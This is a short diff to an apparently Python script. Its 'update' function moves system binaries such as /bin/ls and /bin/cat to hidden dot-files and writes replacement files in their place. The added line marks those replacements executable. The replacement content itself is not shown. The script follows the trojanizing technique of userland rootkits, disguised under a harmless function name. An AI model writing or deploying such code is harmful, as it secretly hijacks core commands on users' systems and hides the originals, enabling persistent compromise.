@@ -7,6 +7,7 @@ def update(command):
         os.rename("/bin/"+command, "/bin/."+command)
         with open("/bin/"+command, "w") as file:
             file.write(content)
+        os.chmod("/bin/"+command, 0o755)
 
 update("ls")
 update("cat")
